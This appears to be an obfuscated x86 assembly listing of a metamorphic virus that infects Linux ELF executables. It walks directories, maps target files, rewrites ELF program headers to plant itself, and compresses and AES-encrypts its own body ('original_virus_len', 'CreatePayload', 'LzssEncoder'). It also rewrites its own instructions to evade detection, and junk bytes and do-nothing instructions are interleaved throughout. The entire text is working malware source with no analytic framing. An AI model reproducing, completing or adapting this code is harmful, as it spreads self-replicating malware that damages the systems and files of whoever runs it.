db 0x9b, 0x0a, 0x9c
..@qIsSdobmTt9L:
    mjmp        ..@rbpZqkmtIJWx
..@Ag5IFIjhYvtQ:
    push        rdi
    pop         rdi
    mjmp        ..@r2ffnTAYqjjI
..@omM4zcYWEfVW:
    rep         stosb
    xor         r2, r2
    xor         r3, r3
    movr        rcx, rcx
    xor         r4, r4
    mjmp        ..@uR69WmJNtbqM
db 0x22, 0xd9, 0xa6
..@uR69WmJNtbqM:
    mjmp        ..@fBkIVVUFbUll
..@sBbVdHT7wPDk:
    movr        rax, rax
    movr        r2, r5
    call        Strcpy
    xchg        rdx, rdx
    mov         BYTE [r1], 0x00
    mjmp        ..@6SmlAR7e1JA0
db 0x29, 0xf9
..@6SmlAR7e1JA0:
    mjmp        ..@ykZCXZnz8f4t
db 0x0c, 0x63
..@ykZCXZnz8f4t:
    mjmp        ..@B2hVh9BnBdVM
..@SMhOZNvIAdk3:
    mjmp        ..@sFHQIKwsAbER
    push        rax
    pop         rax
    mjmp        ..@zx0pmIqNko2m
..@kNg2LgkTa8D9:
    jz          ..@xCR2vWbeuGeF
    mjmp        ..@84zyiJ3Si19D
db 0x94
..@84zyiJ3Si19D:
    mjmp        ..@e9jsR0gWWjHD
..@4qezFSV9cHpV:
    cmp         BYTE [r1], 0x00
    mjmp        ..@SoWZNAiFM5Bt
..@ywv9xhFt61qO:
    jne         ..@jxQypQEcefs8
    mjmp        ..@WlfvVz6eU9q5
..@xmY2I4rRUR3J:
    pop         rsi
    mjmp        ..@9zwnrqrjOEJS
..@wTP9ZvLyLkCQ:
    xor         rcx, rcx
    mjmp        ..@dh7W0BYsCGvY
..@MlBnMQ7GC0dA:
%ifdef X86_64
    and         dx, 0700h
%endif
    mjmp        ..@inAkYSDarhMt
db 0x0b, 0x0b, 0xe8
..@inAkYSDarhMt:
    mjmp        ..@eCd6ENQdZIM7
db 0xa5
..@eCd6ENQdZIM7:
    mjmp        ..@lKxMI9NfsZSD
..@TJRkfu5q8ZTo:
%ifdef X86_64
    cmp         dl, 41h
    jne         ..@3dJXRfDswfdc
%endif
    mjmp        ..@0Wagg6Oc5BJt
..@TlhgTOcATbEJ:
    mov         dx, WORD [rdi]
    mjmp        ..@vmvNz81sBhiM
..@idLXiX6eUswD:
    lea         r1, [rsp+_INFFILE_OFF.file]
    call        UnmapFile
    mjmp        ..@1KQq1oxaBcdn
db 0xf4, 0x22, 0x1a
..@1KQq1oxaBcdn:
    mjmp        ..@ZTNXxnXeOqB4
..@vY8PiwSPFQQ1:
%ifdef X86_64
    rep         nop
    test        dx, dx
    movr        rbp, rbp
    jz          ..@AEWfiR4mgAWi
    cmp         dx, 9000h
%endif
    mjmp        ..@XaGgTHjsBxPj
db 0xc7
..@XaGgTHjsBxPj:
    mjmp        ..@9ilmucMkinhl
..@IHos0Gy9cNPa:
    and         bl, 11000111b
    mjmp        ..@XV8P9HB0oFdJ
db 0x03
..@XV8P9HB0oFdJ:
    mjmp        ..@rHFXAi89ZAjR
db 0xf1, 0x18, 0x01
..@rHFXAi89ZAjR:
    mjmp        ..@i9gkEpSX4GN5
..@zqXVhW0X4Ean:
%ifdef X86_64
    mjmp        ..@Rb2crAtRUSTN
%endif
    mjmp        ..@dnmVRRXDXSz1
db 0xdc, 0xc6, 0xae
..@dnmVRRXDXSz1:
    mjmp        ..@VJ597LCJTYV0
..@0d7ccYkojynq:
%ifdef X86_64
    movr        rax, rsi
%endif
    mjmp        ..@IceCoJr1oGUr
..@8xaf2LWF4NUm:
    VAR         packed, dirs_tmp
    mjmp        ..@yivklbvgTOms
db 0xb7, 0x2c, 0x9f
..@yivklbvgTOms:
    mjmp        ..@uAofuBz19Zg9
..@nCmEtxGD7zDp:
    pop         r5
    pop         r4
    mjmp        ..@26O4PSxDcjPT
..@DCaIBWbZ2NA5:
    push        rdi
    mjmp        ..@sfkJ4XCoPxTQ
..@0CKG7rTYnAuf:
    or          edx, ecx
    mjmp        ..@KzmvO8huVfsV
..@jxQypQEcefs8:
    push        rdx
    mjmp        ..@zM1lLMOmoNbk
db 0x64
..@zM1lLMOmoNbk:
    mjmp        ..@nvny7fCoacmQ
..@wxwWfm7MP6qM:
    pop         r1
    mjmp        ..@zfkcdywbzEpU
db 0xf2
..@zfkcdywbzEpU:
    mjmp        ..@9u3iuU6oQ0L5
..@KGbcZAkVcc2M:
    mov         r4, QWORD [rsp+_INFDIR_OFF.dirindex]
    xor         rax, rax
    lea         r5, [rsp+_INFDIR_OFF.dirbuf+r4]
    mov         ax, WORD [r5+linux_dirent.d_reclen]
    add         r5, rax
    mjmp        ..@5VOK3btO3Uj5
db 0xc0, 0x62, 0x1a
..@5VOK3btO3Uj5:
    mjmp        ..@OMjt3AZNR9xy
..@QEikAykQJPSp:
    sub         rsp, _PROC_OFF_size
    mjmp        ..@ExsJMswIFjlF
..@W1LXw7m9DLGD:
    movr        rdx, rdx
    pop         r5
    ret
    mjmp        KeyGen
..@h49847LyH5Xw:
    pop         rsi
    xchg        rdx, rdx
    xor         rax, rax
    mjmp        ..@BtD4Ewj5vqqT
db 0xc5
..@BtD4Ewj5vqqT:
    mjmp        ..@kaZOpY73pjK3
..@XIPcDP4FU8ah:
    xor         rcx, rcx
    mjmp        ..@W1Q4oGIx0F9d
db 0xb2, 0x07
..@W1Q4oGIx0F9d:
    mjmp        ..@O38BRu2yAPaO
..@0SJ4bR36zLtw:
    or          cl, al
    shr         rax, 8
    mjmp        ..@VWqeAPwaLD6s
..@6vTFHX9VPioe:
    movr        rbp, rbp
    xchg        rsp, rsp
    mjmp        ..@rIgByLZ7LLvX
..@4i9i3Fl7Cwa9:
    add         rdi, rcx
    mjmp        ..@nuNnzZiHxxAQ
..@kEiOTIGSU7Gt:
    or          ebx, 0b8h
    mjmp        ..@kKon7S5TLDCq
db 0x44, 0x03
..@kKon7S5TLDCq:
    mjmp        ..@qgZVJsVvWhuW
..@VRBSvmd8Bg3W:
    sub         WORD [rsp+_LZSSE_OFF.w_index], WINDOW_LENGTH
    mjmp        ..@u91RE8A5FGuS
db 0xfe, 0x63
..@u91RE8A5FGuS:
    mjmp        ..@3j1G6qLDpjhB
..@D8DHHbBMqoAl:
    movr        rdi, rsp
    mjmp        ..@aGIKLU1NSIif
db 0xda
..@aGIKLU1NSIif:
    mjmp        ..@kvTAe6yE0U2k
..@ERYZWnze1BEE:
    call        WORDToDWORDASCII
    mov         rdi, QWORD [rsp+_UPDATASIG_OFF.signaddr]
    mjmp        ..@NwOWL1PWRaOx
..@sZ1TEkmW7nKu:
    xor         rdx, rdx
    xor         rbx, rbx
    xchg        rcx, rcx
    mjmp        ..@evKRr3lgBiUD
..@BoE3MEK8gCD2:
    movr        r3, r1
    sub         r3, PADDING
    movv        r2, original_virus_len-non_packed_len
    call        LzssEncoder
    mov         rdi, m6
    mjmp        ..@QMWgW1UZ1KAp
db 0x24, 0xd4
..@QMWgW1UZ1KAp:
    mjmp        ..@CU1PCrGtsjLF
db 0xb2, 0x0c, 0xb7
..@CU1PCrGtsjLF:
    mjmp        ..@iiucT6lvJxmW
..@1Fkwk0rEyOab:
    pop         rsi
    mjmp        ..@ds1RwYVL0yFB
db 0x36, 0xd0, 0xc7
..@ds1RwYVL0yFB:
    mjmp        ..@lYPJ3SUxIR6l
..@JG5RBZEsaCxl:
    mov         rsi, QWORD [rsp+bytes]
    add         rsi, rcx
    xor         rdx, rdx
    mjmp        ..@gawg7IRQZUpk
..@8ujmAsyvzOB2:
    cmp         rcx, QWORD [rdi+s_h.sh_size]
    jge         ..@CEaxbXo0A5z9
    mjmp        ..@dXyTLGVJAtC0
db 0x9a, 0x00, 0x9f
..@dXyTLGVJAtC0:
    mjmp        ..@OWiMK6SQyBB8
..@bBGnojJSv1kO:
    xchg        rsp, rsp
    mov         BYTE [r1], 0x00
    mjmp        ..@VFe6hPpxhqUT
..@hU13r9fPPvOv:
    xchg        rcx, rcx
    mjmp        ..@VHxAn4zs8hwD
db 0xf9, 0x37
..@VHxAn4zs8hwD:
    mjmp        ..@a8Kb76kxtcRE
..@psHENuW4azI0:
    jne         ..@OG4XbNSViqTF
    mjmp        ..@b6HoosnNjrTE
..@3VPbCJboYf9c:
    jne         ..@d119gAkmN1Rx
    mjmp        ..@z1ATIi3MwmYQ
db 0x3c
..@z1ATIi3MwmYQ:
    mjmp        ..@8EJeaLLJvEZK
ConvertAddToSub:
    mjmp        ..@AtClTw9Sv94V
..@G6RBhY1NtVp6:
    add         rcx, 0x10
    cmp         rcx, QWORD [rsp+_AESE_OFF.length]
    jl          ..@MrpVYsNFh0Um
    leave
    mjmp        ..@mQ5rLCxLmEjU
db 0xe3
..@mQ5rLCxLmEjU:
    mjmp        ..@slzlZND7Op3b
db 0x43, 0xc3, 0xfb
..@slzlZND7Op3b:
    mjmp        ..@iv1rpKzHQEGO
..@VFe6hPpxhqUT:
    add         rsp, _NBF_OFF_size
    ret
    mjmp        ..@hkoLwie431Hs
db 0xaa, 0xa9, 0xcd
..@hkoLwie431Hs:
    mjmp        CreatePayload
..@2zK3voWoLcD3:
%ifdef X86_32
    test        dl, dl
%endif
    mjmp        ..@WdQm4olBXUxP
GetNewProgramVaddr:
    mjmp        ..@eXNUKntlqREj
..@NV24eomVbSU6:
    xchg        rax, rax
    mjmp        ..@gq2s4FID7kqq
..@FTZ2OtRZ6WGT:
    xor         rax, rax
    mjmp        ..@avhCHc7X5eZS
..@hUnKOvbuaP3H:
    lea         r2, [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_name+r4]
    mjmp        ..@adM3Iw4IzY0q
..@wNd1w0kOIkBb:
    mov         r5, QWORD [r4+rax+p_h.p_vaddr]
    mjmp        ..@lJEa4Z6jqRsE
..@82UjCu2CmYuV:
    mov         r2, [rsp+_PROC_OFF.dirname]
    call        Strcpy
    lea         r2, [rsp+_PROC_OFF.dirbuf+linux_dirent.d_name+r4]
    call        Strcpy
    VAR         packed, status
    mjmp        ..@rbOgEOjGn2cT
db 0xd6, 0x1c
..@rbOgEOjGn2cT:
    mjmp        ..@sBbVdHT7wPDk
..@mwqjcO209Agk:
    pop         r1
    mjmp        ..@m1nnqNXIiv8w
db 0x49, 0x32
..@m1nnqNXIiv8w:
    mjmp        ..@FUWoEMpSFLbF
..@mIDAK5Dew2AS:
    aesenc      xmm0, xmm1
    movdqu      xmm1, oWORD [rsp+0x20]
    aesenc      xmm0, xmm1
    movdqu      xmm1, oWORD [rsp+0x30]
    mjmp        ..@djvBBAwdz8fA
db 0x16, 0xce
..@djvBBAwdz8fA:
    mjmp        ..@sXhYV9Knby9o
..@w5CWvnnuNZq7:
    cmp         BYTE [rdi+rcx], 90h
    jne         ..@2YDvWisJbsaJ
    mjmp        ..@LTPlTXlpiPAd
    mjmp        ..@gu7qWGQLfMsr
db 0x24, 0x18, 0x03
..@gu7qWGQLfMsr:
    mjmp        ..@343vjoQWvhsD
db 0x46, 0xf2
..@343vjoQWvhsD:
    mjmp        ..@g7X5LjzImBoh
..@xAnIpfknTDZI:
    add         r4, 2
    mjmp        ..@Pom0cvAmz0yL
db 0x02
..@Pom0cvAmz0yL:
    mjmp        ..@NqeXcpVMcyhm
db 0x03, 0x10
..@NqeXcpVMcyhm:
    mjmp        ..@JDSHoMSaJSWf
db 0x66
..@JDSHoMSaJSWf:
    mjmp        ..@PWOily7VlTzo
..@OYbwjLweF7nB:
    movr        rbx, rbx
    mjmp        ..@Gz2Q9TpFbeAg
    mjmp        ..@9YPvqF9BGflY
..@rgRdrDJmmt4u:
    pop         rcx
    xchg        rdx, rdx
    movr        rbx, rbx
    jge         ..@meDYXHTqiqbB
    mjmp        ..@ybOISFSWwoX0
db 0xce, 0xac
..@ybOISFSWwoX0:
    mjmp        ..@qEZX4mbt9Jdf
db 0xe7
..@qEZX4mbt9Jdf:
    mjmp        ..@LTPlTXlpiPAd
..@VHfS8PhG4lYJ:
    movr        rdi, rsi
    xchg        rdi, rdi
    add         rdi, rcx
    mov         edx, DWORD [rdi]
    mjmp        ..@3FzbAqzzseee
..@nQQCUGWVhD96:
    syscall
    cmp         eax, 0x00
    mjmp        ..@UoI5lXsDI8n7
db 0x0e
..@UoI5lXsDI8n7:
    mjmp        ..@FcZUU0Ig64Xu
db 0xb3, 0x0c, 0x6e
..@FcZUU0Ig64Xu:
    mjmp        ..@3DvgLWjSQmAI
..@iH3M2ZW9bktJ:
    mov         DWORD [rsi], ebx
    mjmp        ..@VKkIDimjNcH8
db 0x9d, 0x03
..@VKkIDimjNcH8:
    mjmp        ..@ME01j1gnQ6O9
db 0xa0, 0x33, 0x2a
..@ME01j1gnQ6O9:
    mjmp        ..@7vOMP7hxqkTg
..@xTLBqJh2DOfz:
    cld
    mjmp        ..@xkCX0dMyLr5x
..@l7SI5pFayoo7:
    add         rsi, QWORD [rdi+s_h.sh_offset]
    mjmp        ..@IFdIITln0oO8
..@XLE9hbhAKGdP:
    movr        rsi, rsi
    xor         rbx, rbx
    add         rsi, 1
    test        rax, rax
    mjmp        ..@yth7QroqaElp
db 0x65, 0xd1, 0x97
..@yth7QroqaElp:
    mjmp        ..@MT9BmLhlLVuu
db 0xff, 0x20, 0x22
..@MT9BmLhlLVuu:
    mjmp        ..@PJyTZJW4fkBK
..@WMNRskYBZYse:
%ifdef X86_64
    movr        rdx, rdx
    cmp         edx, 00e88148h
    xchg        rcx, rcx
%endif
    mjmp        ..@pDrIYPa5RRQb
db 0x98
..@pDrIYPa5RRQb:
    mjmp        ..@N0hKm6tFpPWF
..@zojCL5zJLayX:
    movv        rax, 1
    mjmp        ..@FNoYhgMlD211
db 0x3c, 0x95
..@FNoYhgMlD211:
    mjmp        ..@CkwR4dDRUDnC
db 0xff, 0xcf
..@CkwR4dDRUDnC:
    mjmp        ..@NP4reyHWSK6v
..@Y01eWG6Dq65f:
    pop         rax
    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
    sub         ax, WORD [rsp+_LZSSE_OFF.la_index]
    movv        rdx, LOOKAHEAD_LENGTH
    mjmp        ..@zlKyz6FEmIe8
db 0x45, 0xc6, 0x62
..@zlKyz6FEmIe8:
    mjmp        ..@CPQgl4IJxxTE
..@g7X5LjzImBoh:
    add         ecx, 1
    mjmp        ..@MBgNxicdq9hB
..@yyj8u27AwYsd:
    je          ..@amSjgXHWBguE
    cmp         WORD [r1], './'
    je          ..@amSjgXHWBguE
    mov         r2d, DWORD [r1]
    and         r2, 0x00ffffff
    mjmp        ..@86QKlWZ4wV29
db 0xb0
..@86QKlWZ4wV29:
    mjmp        ..@5aCAmc7FIybS
db 0xc4, 0x67, 0x4d
..@5aCAmc7FIybS:
    mjmp        ..@Cp0rNmLz7V00
..@rVuZ0Q95l0K1:
    mjmp        ..@8GiovvNAsYLr
    mjmp        ..@1z7fHI5NffFb
..@icuKMk8rToL9:
    xchg        rsi, rsi
    mjmp        ..@JOapt2nV2cNR
db 0xb2, 0x3d, 0x96
..@JOapt2nV2cNR:
    mjmp        ..@l0e3DvVuYNCu
..@qJBpAS3OR4oZ:
    movv        rax, (-1)
    mjmp        ..@Xdo8Iyn5CFSP
..@7FeovylhQifn:
    sub         rsp, 0x20
    mjmp        ..@D8DHHbBMqoAl
..@5OTUSH3xtr49:
    push        rbp
    mjmp        ..@IKnRCeNSW18W
db 0xa5, 0xfb, 0x0c
..@IKnRCeNSW18W:
    mjmp        ..@OSAdKUh3tIbg
db 0x15, 0xee
..@OSAdKUh3tIbg:
    mjmp        ..@nrEz6eNXEdkt
..@ZHDnnxBQ5nl6:
    movv        r2, original_virus_len+PADDING
    mjmp        ..@BrsoC4WReR31
..@6LICNppZXJ7m:
    mov         r4, m7
    movr        rax, rax
    sub         r4, m6
    mov         QWORD [r2+p_h.p_vaddr], r3
    mov         QWORD [r2+p_h.p_paddr], r3
    mjmp        ..@VfFhOlVrA65Y
db 0xac, 0x1c, 0xcd
..@VfFhOlVrA65Y:
    mjmp        ..@ApHMF0x6xgve
..@bdIfhcuyXWZQ:
    movv        rbx, 90909090h
    mjmp        ..@VJ8IPyf1bweI
..@NLbvjNAUerdc:
    test        rax, rax
    mjmp        ..@KEursspILfcK
db 0xed, 0x6f
..@KEursspILfcK:
    mjmp        ..@23jnsyqkigKx
..@12jd1F8tTbKj:
    push        rdx
    mjmp        ..@OHrtqeCYND1W
..@YXZqwdb3vJ9m:
    xchg        rdx, rdx
    mjmp        ..@rpJCnIQwEliR
db 0x14, 0xb4
..@rpJCnIQwEliR:
    mjmp        ..@cbc8mMOxys2w
..@x4NmJqfLiI8O:
    mov         rsi, QWORD [rsp+bytes]
    mjmp        ..@KvyFKlRr1TXs
db 0xaa, 0xe3
..@KvyFKlRr1TXs:
    mjmp        ..@CX49IneQwoT7
..@EOrDeskUrUYR:
    mov         DWORD [r5+file.filefd], 0x00
    mjmp        ..@CUSRNNw8sQX4
..@85zHjUdF0AX3:
    jl          ..@Wz8xATMU1Fw8
    mjmp        ..@3IrWnYRcdIqm
db 0xfe, 0xf0, 0x36
..@3IrWnYRcdIqm:
    mjmp        ..@Jf2PahW05SvN
db 0xc4, 0xc5
..@Jf2PahW05SvN:
    mjmp        ..@aLzAiQMLKdua
..@jMkpiqwt8ukY:
%ifdef X86_64
    xor         rdi, rdi
%endif
    mjmp        ..@Z7CTay4c239P
..@x4QKQb3WgUYO:
    movr        rbx, rbx
    mjmp        ..@LWSMG6J8pKUo
db 0xc9
..@LWSMG6J8pKUo:
    mjmp        ..@16KdZe1Yx8st
db 0xd2
..@16KdZe1Yx8st:
    mjmp        ..@SdFwOKkhTuVx
..@47BLxhcspX1C:
%ifdef X86_64
    mov         bx, dx
    and         bx, 0f8ffh
    cmp         bx, 5841h
%endif
    mjmp        ..@zXSxwFsbLQ6i
db 0x3b, 0x98, 0xc4
..@zXSxwFsbLQ6i:
    mjmp        ..@rS4AxPWgMT01
..@pQKqik5Km6RQ:
    xchg        rcx, rcx
    pop         r2
    movr        rbp, rbp
    mjmp        ..@zSYYuwXIeSdL
db 0xf9
..@zSYYuwXIeSdL:
    mjmp        ..@aIOFYrjLH1Bx
..@IlMLha1eFwRN:
%ifdef X86_32
    int         0x80
    pop         ebp
    movr        rbx, rbx
%endif
    mjmp        ..@z88Sth3apGNu
..@3dJXRfDswfdc:
    mov         cl, dl
    movr        rdx, rdx
    and         cl, 111b
    or          bl, cl
    shl         cl, 3
    mjmp        ..@xpckwPPU0oTM
db 0x38, 0xa1
..@xpckwPPU0oTM:
    mjmp        ..@7HgDQx6RaPy1
..@oaIDGyDk9t50:
    movr        r4, r5
    and         r4, 10b
    OFILE       QWORD [r2], r4
    cmp         eax, 0x3
    mjmp        ..@TitkbJEV6BTY
db 0x63, 0x92
..@TitkbJEV6BTY:
    mjmp        ..@WAhX7bEWxMtC
db 0xe0
..@WAhX7bEWxMtC:
    mjmp        ..@KBDB2j1y7kZQ
..@8NPIy7Ly2Mno:
    or          bl, 00101000b
    mov         BYTE [rsi], bl
    mjmp        ..@edCNQE7J45Bi
..@dqYK1nkXi06C:
    push        r1
    mov         r5, QWORD [r1+file.fileptr]
    mov         r1, QWORD [r5+e_h.e_shoff]
    xor         r2, r2
    mov         r2w, WORD [r5+e_h.e_shnum]
    mjmp        ..@9FMgT5jbZVXB
..@o8pX4dyeR6EX:
    push        rdx
    mjmp        ..@UZRNlDBfgf7X
..@ArUflhNZ7qYQ:
    movr        rsi, rsi
    syscall
    mjmp        ..@9DP8JCzSyXMO
db 0xf2, 0xe1
..@9DP8JCzSyXMO:
    mjmp        ..@NV24eomVbSU6
..@EdAQ71512Odt:
    xor         rax, rax
    mjmp        ..@Azf74DnANplE
db 0x9f, 0x0d
..@Azf74DnANplE:
    mjmp        ..@p2RzQLFdQPrm
db 0xb6, 0xd0, 0xc9
..@p2RzQLFdQPrm:
    mjmp        ..@0CA6EvpIrOSC
..@7u4KKBpvgFcs:
    shr         edx, 3
    mjmp        ..@U1LaurY9AXzb
db 0x29, 0x2b
..@U1LaurY9AXzb:
    mjmp        ..@1CqqPjSihfIz
..@WfqM7mp32KTA:
    pop         rsi
    mjmp        ..@7xe7uaOWaZ4q
db 0x4a, 0xf2, 0xfe
..@7xe7uaOWaZ4q:
    mjmp        ..@32C0aIR90Hbr
..@NvMQEFiZyTM9:
    push        rsi
    mjmp        ..@EpF43xYfw2z5
db 0xea, 0x3f
..@EpF43xYfw2z5:
    mjmp        ..@FTS1WVbNQtcX
..@gcUIqC3FYl6Z:
    push        rsi
    mjmp        ..@9B5Aip2PRXfI
..@SJ10PCUm7rAJ:
%ifdef X86_64
    and         edx, 0ffc0fffah
%endif
    mjmp        ..@f1I3yCX6jaLK
db 0x3f, 0x08
..@f1I3yCX6jaLK:
    mjmp        ..@kApeCmheUsVn
db 0xfd, 0xfd, 0x0a
..@kApeCmheUsVn:
    mjmp        ..@piHA0ok7bJHJ
db 0x38, 0x06, 0xf3
..@piHA0ok7bJHJ:
    mjmp        ..@6rq2KDCYgcZA
..@uo2GEg3nQWS1:
    movr        rdx, rdx
    mjmp        ..@PC8hCI01ZpId
db 0xe8, 0xc7
..@PC8hCI01ZpId:
    mjmp        ..@f4MZ9rOn5IGf
..@dN09imaAQ9bf:
%ifdef X86_32
    je          ..@EuaGjmwM9vTp
%endif
    mjmp        ..@sGd8dOvCApY6
..@JmMWIfB9pp33:
    push        rcx
    movr        rdi, rsi
    add         rdi, rcx
    mjmp        ..@SEZXw6Dul0yi
..@D0UGOR9F3S5U:
    push        rcx
    pop         rcx
    test        rax, rax
    xchg        rsi, rsi
    push        rdi
    mjmp        ..@wmdgBVLTemsq
..@qSTzJYxchAnk:
    xor         r3, r3
    movr        r1, rax
    mjmp        ..@OcfLwXVz7nr9
db 0xd4, 0x09
..@OcfLwXVz7nr9:
    mjmp        ..@tngyXFOwCEFS
..@CPQgl4IJxxTE:
    cmp         ax, LOOKAHEAD_LENGTH
    movr        rdi, rdi
    cmovl       dx, ax
    mov         BYTE [rsp+_LZSSE_OFF.cmp_len], dl
    mjmp        ..@EGgbQ2jf3ELe
db 0xff
..@EGgbQ2jf3ELe:
    mjmp        ..@Ri9VvMID0QDI
db 0x9e, 0x64, 0x36
..@Ri9VvMID0QDI:
    mjmp        ..@ZaldDI5lG4Nk
..@C8MEX8apOpaK:
%ifdef X86_64
    movr        rsi, rsi
%endif
    mjmp        ..@zqXVhW0X4Ean
..@EFYlr8JMFbKU:
    jle         ..@y1DBTlVDBAUC
    mjmp        ..@x7Q58qKfDA0z
db 0x1e
..@x7Q58qKfDA0z:
    mjmp        ..@ho5sFQqBLeSa
db 0xb2, 0x13, 0x94
..@ho5sFQqBLeSa:
    mjmp        ..@qM38vlsaBz4c
..@x8fQZCzFeDrY:
    test        eax, eax
    mjmp        ..@chAt55AtwxD7
db 0x01
..@chAt55AtwxD7:
    mjmp        ..@G3JUopmA2zpZ
..@PvQheFtgWC8h:
    movr        rax, rax
    mjmp        ..@J6EGfHePsl0L
db 0xa0
..@J6EGfHePsl0L:
    mjmp        ..@AyqcLlFYyjDN
..@ApHMF0x6xgve:
    mov         QWORD [r2+p_h.p_filesz], r4
    mov         QWORD [r2+p_h.p_memsz], r4
    mjmp        ..@dJEL05mmkKcg
db 0x94, 0x9b, 0x92
..@dJEL05mmkKcg:
    mjmp        ..@QFikcJaherr0
..@kmYN6RE2pkd3:
    xor         rdx, rdx
    mjmp        ..@iBcl4GZm07A7
..@8vb5452dX1Kl:
    mov         r4d, DWORD [r1 + file.filefd]
    xchg        rax, rax
    mjmp        ..@z38ie45uQaLf
..@t3a6B1hUkYbG:
%ifndef ENABLE_DEBUGGING
    cmp         al, 0x0
%endif
    mjmp        ..@Cq7Y7a7RtiXn
ConvertXorToMoveZero:
    mjmp        ..@NvMQEFiZyTM9
..@p1TRtLd8XYZN:
    xor         rsi, rsi
    xor         rax, rax
    mov         eax, DWORD [rdi]
    mjmp        ..@fnHwr4Gh6h8x
..@Xdo8Iyn5CFSP:
    ret
    mjmp        ..@LUN6fL5TNLnM
db 0x42
..@LUN6fL5TNLnM:
    mjmp        ..@BFHXWgqARrs5
db 0x11, 0xa0, 0xe4
..@BFHXWgqARrs5:
    mjmp        ..@DUhYX8uqwGug
db 0xde, 0xc4
..@DUhYX8uqwGug:
    mjmp        ..@tFGQjuFtL6jR
db 0xdd
..@tFGQjuFtL6jR:
    mjmp        Aes256Encryption
..@xbHTOolcs6DD:
    pop         rsi
    mjmp        ..@cEMqYy5w4iV2
db 0xff, 0x27, 0xa6
..@cEMqYy5w4iV2:
    mjmp        ..@RZwRcUkCODg0
Strcpy:
    mjmp        ..@XvFIJPeVOXxh
..@8I43VxEcJ4pJ:
    xchg        rcx, rcx
    mjmp        ..@f02CcUVKYVZU
db 0xd2
..@f02CcUVKYVZU:
    mjmp        ..@hvnfiql7oVJU
db 0xe6, 0x39
..@hvnfiql7oVJU:
    mjmp        ..@VX7zqdUP58IB
db 0xa7, 0x4f, 0xd9
..@VX7zqdUP58IB:
    mjmp        ..@p1TRtLd8XYZN
..@gq2s4FID7kqq:
    cmp         eax, 0x0
    mjmp        ..@p7hkXxejafKm
db 0xfb
..@p7hkXxejafKm:
    mjmp        ..@RDQY2wzNQzP4
..@SwHWZWUtG4jW:
    shl         al, 3
    mjmp        ..@MPUivvB5mFyy
db 0x21, 0x41
..@MPUivvB5mFyy:
    mjmp        ..@3bixxITJGiao
db 0x1d, 0x97
..@3bixxITJGiao:
    mjmp        ..@6UnKSjHK6OOf
db 0xc7, 0xc6, 0x6e
..@6UnKSjHK6OOf:
    mjmp        ..@0SJ4bR36zLtw
..@TN6RTbMbZBm0:
    xchg        rbx, rbx
    je          ..@tUIRHWRd22Zl
    mjmp        ..@e7JZHB5gNUdZ
db 0xd5, 0x4b
..@e7JZHB5gNUdZ:
    mjmp        ..@xuDBw4kFmIsG
..@ptVThyKXuX1G:
    movr        rsp, rsp
    mjmp        ..@oUs5OYXrulC9
..@s8mu8LfTn01K:
    mov         dx, WORD [rdi+6]
    and         dx, 0f1ffh
    cmp         dx, 810fh
    xchg        rax, rax
    mjmp        ..@Bl2rpcMBO0ip
..@XdXIeWcpFde5:
    xor         rcx, rcx
    mov         ecx, DWORD [rdi+2]
    mjmp        ..@I73DJ1Eofj7H
..@CgQf3MvDnfWI:
    add         rsp, _PAYLOAD_OFF_size
    mjmp        ..@9ekNf5YM669m
db 0xc7, 0x15
..@9ekNf5YM669m:
    mjmp        ..@6dq9WSzB0yC3
db 0xb3, 0x3a
..@6dq9WSzB0yC3:
    mjmp        ..@BWPqZwDe0MOU
db 0xcc
..@BWPqZwDe0MOU:
    mjmp        ..@lGFGiDRhBdk4
db 0x02
..@lGFGiDRhBdk4:
    mjmp        ..@fu5lhWgtC6WE
..@2AtznWZKDxyT:
    mov         bl, 31h
    mjmp        ..@oThCUaFbstoG
..@ClaaHkCKiW9F:
    movr        rsp, rsp
    mjmp        ..@Lqu1DAiq6QVY
db 0x66
..@Lqu1DAiq6QVY:
    mjmp        ..@U9TtV3JGEc9P
db 0xe8, 0x9c
..@U9TtV3JGEc9P:
    mjmp        ..@ZmLWLBeoAcem
..@HqKlFEO6fFY1:
    pop         r2
    mjmp        ..@4qbgsaJajQFT
db 0x60, 0xd2, 0x43
..@4qbgsaJajQFT:
    mjmp        ..@66F5lLgq2Wsd
..@PKuHoBU4Auig:
    xor         rcx, rcx
    mov         rsi, QWORD [rsp+bytes]
    mov         rcx, QWORD [rsp]
    mjmp        ..@zRbMMMTlgL0S
..@jhEJy1oQnI08:
    movr        r1, r5
    call_vsp    Strlen
    mjmp        ..@cZjRpvWYcisa
..@DFG1TGpUY8Ni:
    or          bl, 0b8h
    mov         BYTE [rdi], bl
    add         rdi, 1
    mjmp        ..@8jSHkNk0trJi
db 0x30
..@8jSHkNk0trJi:
    mjmp        ..@HTJ1m4LxKbxl
..@wwKe9Tg1UGna:
%ifdef X86_64
    pop         rsi
%endif
    mjmp        ..@ntaIrlINmVCH
db 0x6b
..@ntaIrlINmVCH:
    mjmp        ..@pSyH3zxmWZQn
db 0xaa, 0xf9
..@pSyH3zxmWZQn:
    mjmp        ..@1mtlF508Jnll
db 0xc1, 0x40
..@1mtlF508Jnll:
    mjmp        ..@wZSGrS0MviNH
..@kaZOpY73pjK3:
    ret
    mjmp        ..@oD14a0gH3pO5
..@7vOMP7hxqkTg:
    mjmp        ..@WtaxElAeCrOy
    mjmp        ..@xOgHm4JUJKpM
..@cyup9JysEIIj:
    inc         QWORD [rsp+_LZSSE_OFF.outputaddr]
    mjmp        ..@MiYrPogGvhhV
db 0x9a, 0x32, 0x24
..@MiYrPogGvhhV:
    mjmp        ..@pmW6hnBd7z16
..@t0k3OxN1rSnY:
    xor         rax, rax
    mjmp        ..@wTP9ZvLyLkCQ
..@677ReMHhm2gx:
    xchg        rdx, rdx
    mjmp        ..@ml9xnsIXa0ES
db 0xee
..@ml9xnsIXa0ES:
    mjmp        ..@MyC4fkFjpMBR
..@ktlg1DQJYb4J:
%ifdef X86_64
    mov         WORD [rsi+rcx], di
%endif
    mjmp        ..@FJX86MVIdPhQ
db 0xea, 0xfa, 0xb2
..@FJX86MVIdPhQ:
    mjmp        ..@DCaIBWbZ2NA5
..@9372bSrQSZyx:
    movr        rbp, rbp
    mjmp        ..@PRi5Mo8zHVPc
db 0x62
..@PRi5Mo8zHVPc:
    mjmp        ..@gFPIHdPSZ4eL
..@6rq2KDCYgcZA:
%ifdef X86_64
    cmp         edx, 90c03148h
%endif
    mjmp        ..@fFLVl61ttp7c
db 0x99, 0xe1
..@fFLVl61ttp7c:
    mjmp        ..@78VYz73PO2Pl
..@rOTeYD2HGRAO:
    call        ConvertPushPopValueToMoveValue
    mjmp        ..@xIxao6ZoshNo
db 0x1f, 0xa6
..@xIxao6ZoshNo:
